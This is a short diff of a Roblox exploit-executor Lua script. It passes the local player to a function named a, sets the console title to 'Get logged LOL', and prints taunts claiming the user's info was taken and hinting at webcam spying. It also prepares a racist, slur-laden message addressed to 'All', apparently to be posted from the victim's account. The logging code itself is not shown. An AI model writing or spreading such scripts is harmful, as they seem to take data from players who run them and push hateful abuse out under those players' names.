@@ -16,8 +16,7 @@ local Players = game:GetService('Players')
 local YourPlayer = Players.LocalPlayer 
 a(YourPlayer)
 rconsolename("Get logged LOL")
-rconsoleprint("Thx for ur info XDDD")
-rconsoleprint("Lets hope you have tape over ur webcam")
+rconsoleprint("Thx for ur info XDDD also lets hope you have tape over ur webcam ;)")
 local args = {
     [1] = "I HATE BTLACK PEOPLE🤮👳🏿‍♂️",
     [2] = "All"
